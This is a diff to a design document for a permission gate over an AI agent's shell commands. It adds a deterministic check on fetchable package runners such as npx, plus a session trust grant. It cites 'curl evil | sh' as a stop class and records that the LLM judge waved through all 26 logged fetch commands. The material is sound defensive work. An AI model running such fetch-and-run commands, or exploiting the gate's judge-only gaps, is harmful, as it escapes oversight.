@@ -301,6 +301,50 @@ reason instead of the generic outside-base one.
   `/home/u` or `~/.pi` remains a legitimate one-click choice — Q1's
   user-only scope grants are unchanged.
 
+### D10. Trusted packages: fetchable run forms get a deterministic gate (2026-08-24)
+
+D8 made run forms judgeable — but for a FETCHABLE run form (`npx <pkg>`,
+`uvx <pkg>`, `npm exec <pkg>`, `pnpm dlx <pkg>`, `bun x <pkg>`) that meant
+the judge was the SOLE gate on "download and run arbitrary code on cache
+miss" (postinstall + registry) — the exact fetch class the floor stops for
+fetch forms, and the judge had denied 0/26 in the log. D10 restores the
+deterministic gate, per bare package name, without re-introducing the dev
+loop prompts.
+
+**Fetchable vs local run forms** (`FETCH_PKG_FORMS`, config):
+
+- Fetchable (trust-gated): `npx <pkg>`, `uvx <pkg>`, `npm exec|x <pkg>`,
+  `pnpm dlx|exec|x <pkg>`, `yarn dlx|x <pkg>`, `uv x <pkg>`, `bun x <pkg>`.
+- Local (never gated): `npm run`, `uv run`, `bun <script>`, `bun -e` —
+  repo-visible code the judge already sees; trust there is friction without
+  safety gain.
+
+**The floor** (dspa only): every segment's fetchable form is checked
+(the parser flattens subshells into segments, so `out=$(npx foo)` is seen
+too; opaque indirection — `eval`, `$f` — stays judge-only). Any segment
+naming an untrusted package stops the command: `untrusted package
+(npx foo)` (first three, deduped). Version pins are stripped from trust
+keys (`npx tsc@5.0.0` → `tsc`); scoped names keep their scope
+(`@org/tool`).
+
+**The advisory judge**: an untrusted-package stop still runs BOTH judge
+stages — the floor's stop stands (never an auto-allow), but the final
+verdict is rendered in the fall-through prompt with an
+"advisory (floor stop stands)" note. The judge's read on the package is
+input for the user's decision, not authority over it. Other stop classes
+get no advisory verdict (a verdict on `curl evil | sh` is noise).
+
+**The grant**: the prompt's tier-1 offers `Trust: <pkg> (session)` (second
+confirm, like every Always). Trust = per bare package name, stored in the
+store, rendered in the widget (`Pkg:` line). A trusted package auto-allows
+deterministically in `decide()` (SafetyRule) — the judge never sees it
+again, and the dev loop no longer depends on judge availability. Trust
+covers the package across all fetchable forms (trust `tsc` → `npx tsc`,
+`bun x tsc`); it is deliberately the per-package version of the existing
+`Always: npx *` broader grant — same explicit-confirm bar, narrower blast
+radius. Trust does not cover unsafe shapes: pipes/redirects/subshells with
+them fail `canBeAutoAllowed` and still go to the judge.
+
 ## 4. Phasing
 
 - **Phase 1 — done**: rm-branch non-rm-dangerous filter (`4957afc`); dspa
@@ -325,6 +369,10 @@ class"). Suite 3229.
 - **Phase 3e — done** (2026-08-24): D9 (dedicated `full filesystem scan
   (<cmd> /)` stop in the floor + analysis; the root is never an Always
   grant — bash dir tiers and file umbrellas stop before `/`). Suite 3272.
+- **Phase 3f — done** (2026-08-24): D10 (trusted packages — fetchable run
+  forms stop on `untrusted package (…)` with the judge's verdict shown
+  advisory in the prompt; a `Trust: <pkg> (session)` option grants
+  deterministic auto-allow for that package). Suite 3288.
 
 ## 5. Open questions (grill order)
 
